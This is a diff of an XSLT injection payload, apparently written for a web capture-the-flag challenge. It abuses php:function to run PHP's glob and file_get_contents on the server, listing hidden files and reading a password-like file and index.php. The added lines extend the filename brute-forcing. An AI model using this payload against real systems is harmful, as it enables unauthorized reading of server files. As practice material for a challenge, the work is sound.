@@ -56,7 +56,16 @@ xmlns:php="http://php.net/xsl"
 <xsl:param  name="shandleBy"    select="php:function('glob','/challenge/web-serveur/ch50/._phpY*')" />
 <xsl:param  name="shandleBz"    select="php:function('glob','/challenge/web-serveur/ch50/._phpZ*')" />
 <xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/._php_*')" />
-
+<xsl:param  name="shandle0"    select="php:function('glob','/challenge/web-serveur/ch50/._php0*')" />
+<xsl:param  name="shandle1"    select="php:function('glob','/challenge/web-serveur/ch50/._php1*')" />
+<xsl:param  name="shandle2"    select="php:function('glob','/challenge/web-serveur/ch50/._php2*')" />
+<xsl:param  name="shandle3"    select="php:function('glob','/challenge/web-serveur/ch50/._php3*')" />
+<xsl:param  name="shandle4"    select="php:function('glob','/challenge/web-serveur/ch50/._php4*')" />
+<xsl:param  name="shandle5"    select="php:function('glob','/challenge/web-serveur/ch50/._php5*')" />
+<xsl:param  name="shandle6"    select="php:function('glob','/challenge/web-serveur/ch50/._php6*')" />
+<xsl:param  name="shandle7"    select="php:function('glob','/challenge/web-serveur/ch50/._php7*')" />
+<xsl:param  name="shandle8"    select="php:function('glob','/challenge/web-serveur/ch50/._php8*')" />
+<xsl:param  name="shandle9"    select="php:function('glob','/challenge/web-serveur/ch50/._php9*')" />
 <xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/._phpasswd')" /> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" />
 <xsl:template match="/">	
@@ -114,6 +123,16 @@ xmlns:php="http://php.net/xsl"
   SCANDIR0 .y*:<xsl:value-of select="$shandleBy"/>  
   SCANDIR0 .z*:<xsl:value-of select="$shandleBz"/>
   SCANDIR0 ._*:<xsl:value-of select="$shandle_"/>   
+SCANDIR0 ._0*:<xsl:value-of select="$shandle0"/>
+SCANDIR0 ._1*:<xsl:value-of select="$shandle1"/>
+SCANDIR0 ._2*:<xsl:value-of select="$shandle2"/>
+SCANDIR0 ._3*:<xsl:value-of select="$shandle3"/>
+SCANDIR0 ._4*:<xsl:value-of select="$shandle4"/>
+SCANDIR0 ._5*:<xsl:value-of select="$shandle5"/>
+SCANDIR0 ._6*:<xsl:value-of select="$shandle6"/>
+SCANDIR0 ._7*:<xsl:value-of select="$shandle7"/>
+SCANDIR0 ._8*:<xsl:value-of select="$shandle8"/>
+SCANDIR0 ._9*:<xsl:value-of select="$shandle9"/>
  PHPINFO:<xsl:value-of select="$strscand"/>     
  DIR1 index.php:<xsl:value-of select="$header"/>   
 <xsl:value-of select="name"/>
